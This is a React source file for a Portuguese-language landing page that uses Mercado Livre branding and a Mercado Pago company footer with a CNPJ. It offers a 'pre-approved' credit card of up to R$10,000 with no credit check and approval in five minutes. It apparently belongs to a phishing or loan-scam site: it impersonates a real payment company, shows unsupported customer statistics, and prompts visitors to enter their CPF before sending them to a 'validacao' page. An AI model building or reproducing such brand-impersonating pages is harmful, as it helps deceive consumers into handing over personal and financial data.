import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Cartão de Crédito Pré-aprovado - Limite de até R$10.000" },
      { name: "description", content: "Solicite seu cartão de crédito pré-aprovado com limite de até R$10.000. Sem consulta ao SPC/Serasa, aprovação em 5 minutos." },
      { property: "og:title", content: "Cartão de Crédito Pré-aprovado" },
      { property: "og:description", content: "Limite de até R$10.000. Sem burocracia." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Index,
});

import heroImg from "@/assets/hero-mercado-livre.png";
import step1Img from "@/assets/step-1.png";
import step2Img from "@/assets/step-2.png";
import step3Img from "@/assets/step-3.png";
const steps = [
  { img: step1Img, text: "Preencha seu CPF para consultar seu limite de cartão pré-aprovado" },
  { img: step2Img, text: "Escolha seu modelo de cartão e forma de envio" },
  { img: step3Img, text: "Receba seu cartão no conforto de casa e comece a usar" },
];

function Index() {
  const [idx, setIdx] = useState(0);
  const navigate = useNavigate();

  useEffect(() => {
    const t = setInterval(() => setIdx((i) => (i + 1) % 3), 5000);
    return () => clearInterval(t);
  }, []);

  const handleCTA = () => {
    navigate({ to: "/validacao" });
  };

  return (
    <div className="min-h-screen bg-[#F5E84A]">
      <div className="max-w-md mx-auto min-h-screen bg-[#F5E84A] relative">
        {/* Header */}
        <div className="flex items-center px-4 py-3 bg-[#FFE600] shadow-sm">
          <div className="flex-1 flex justify-center items-center">
            <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
          </div>
        </div>

        {/* Hero */}
        <div className="relative">
          <img src={heroImg} alt="Cartão Mercado Pago Pré-aprovado" className="w-full h-auto object-contain block" />
        </div>

        {/* Timeline */}
        <div className="px-4 -mt-3 relative z-10">
          <div className="bg-white rounded-xl shadow-md p-6">
            <div className="flex justify-center mb-4">
              <div className="w-12 h-1.5 rounded-full bg-[#F5E84A]" />
            </div>
            <h2 className="text-2xl font-extrabold text-gray-900 mb-8 text-center leading-tight">
              Aproveite seu cartão de crédito de forma segura, rápida e sem burocracia
            </h2>

            <div className="relative pl-14">
              {[
                { title: "Peça seu cartão de crédito", text: "Você pede em poucas etapas e nós cuidamos do resto." },
                { title: "Vamos analisar seu pedido", text: "Queremos te conhecer analisando seu histórico com relação a crédito." },
                { title: "Receba seu cartão", text: "Aprovado, seu cartão chega no conforto da sua casa." },
              ].map((item, i, arr) => (
                <div key={i} className="relative pb-8 last:pb-0">
                  {i < arr.length - 1 && (
                    <span className="absolute left-[-32px] top-10 bottom-0 w-0.5 bg-[#3483FA]" />
                  )}
                  <div className="absolute left-[-46px] top-0 w-10 h-10 rounded-full border-2 border-[#3483FA] bg-white flex items-center justify-center text-[#3483FA] font-bold">
                    {i + 1}
                  </div>
                  <h3 className="font-bold text-gray-900 text-base">{item.title}</h3>
                  <p className="text-sm text-gray-600 mt-1">{item.text}</p>
                </div>
              ))}
            </div>

            <button
              onClick={handleCTA}
              className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md mt-6 transition-all duration-300 animate-pulse"
            >
              Solicitar meu cartão agora
            </button>

            <div className="flex items-center justify-center mt-4 pt-4 border-t border-gray-100 text-gray-600">
              <i className="fas fa-lock mr-2 text-gray-900" />
              <span className="text-sm">Seus dados estão protegidos e seguros</span>
            </div>
          </div>
        </div>



        {/* Como Solicitar - Carrossel */}
        <div id="como-solicitar" className="px-4 mt-6">
          <div className="bg-white rounded-xl shadow-md p-6">
            <h2 className="text-xl font-semibold text-gray-800 mb-6 text-center">Como solicitar?</h2>

            {/* Indicador de passos */}
            <div className="flex items-center justify-center gap-2 mb-4">
              {steps.map((_, i) => (
                <div key={i} className="flex items-center gap-2">
                  <button
                    onClick={() => setIdx(i)}
                    className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all ${
                      i === idx ? "bg-[#3483FA] text-white" : "bg-gray-200 text-gray-600"
                    }`}
                  >
                    {i + 1}
                  </button>
                  {i < steps.length - 1 && (
                    <div className={`w-6 h-0.5 ${i < idx ? "bg-[#3483FA]" : "bg-gray-200"}`} />
                  )}
                </div>
              ))}
            </div>

            {/* Slide */}
            <div className="overflow-hidden">
              <div
                className="flex transition-transform duration-500"
                style={{ transform: `translateX(-${idx * 100}%)` }}
              >
                {steps.map((s, i) => (
                  <div key={i} className="w-full shrink-0 flex flex-col items-center text-center px-2">
                    <img src={s.img} alt={`Passo ${i + 1}`} className="w-full max-w-xs rounded-lg" />
                    <p className="text-sm text-gray-700 mt-3">{s.text}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Setas */}
            <div className="flex justify-between items-center mt-4">
              <button
                onClick={() => setIdx((i) => (i - 1 + steps.length) % steps.length)}
                className="w-10 h-10 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-700"
                aria-label="Anterior"
              >
                <i className="fas fa-chevron-left" />
              </button>
              <button
                onClick={() => setIdx((i) => (i + 1) % steps.length)}
                className="w-10 h-10 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-700"
                aria-label="Próximo"
              >
                <i className="fas fa-chevron-right" />
              </button>
            </div>
          </div>
        </div>


        {/* Estatísticas */}
        <div className="px-4 mt-6">
          <div className="bg-gradient-to-br from-[#3483FA] to-[#1c5fc7] rounded-2xl shadow-xl p-5 flex justify-between text-center relative overflow-hidden">
            <div className="absolute -top-6 -right-6 w-24 h-24 bg-white/10 rounded-full" />
            <div className="absolute -bottom-8 -left-8 w-28 h-28 bg-white/5 rounded-full" />
            <div className="relative flex-1">
              <div className="flex items-center justify-center gap-1 text-yellow-300 mb-1">
                <i className="fa-solid fa-users text-sm" />
              </div>
              <p className="text-2xl font-extrabold text-white leading-none">+500mil</p>
              <p className="text-[11px] text-white/80 mt-1 font-medium uppercase tracking-wide">Clientes</p>
            </div>
            <div className="w-px bg-white/20 mx-2" />
            <div className="relative flex-1">
              <div className="flex items-center justify-center gap-1 text-yellow-300 mb-1">
                <i className="fa-solid fa-star text-sm" />
              </div>
              <p className="text-2xl font-extrabold text-white leading-none">4.8/5</p>
              <p className="text-[11px] text-white/80 mt-1 font-medium uppercase tracking-wide">Avaliação</p>
            </div>
            <div className="w-px bg-white/20 mx-2" />
            <div className="relative flex-1">
              <div className="flex items-center justify-center gap-1 text-yellow-300 mb-1">
                <i className="fa-solid fa-bolt text-sm" />
              </div>
              <p className="text-2xl font-extrabold text-white leading-none">5 min</p>
              <p className="text-[11px] text-white/80 mt-1 font-medium uppercase tracking-wide">Aprovação</p>
            </div>
          </div>
        </div>



        {/* Footer */}
        <div className="px-4 pb-6">
          <div className="text-center text-xs text-gray-500">
            <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
            <p>CNPJ: 10.573.521/0001-91</p>
          </div>
        </div>
      </div>
    </div>
  );
}
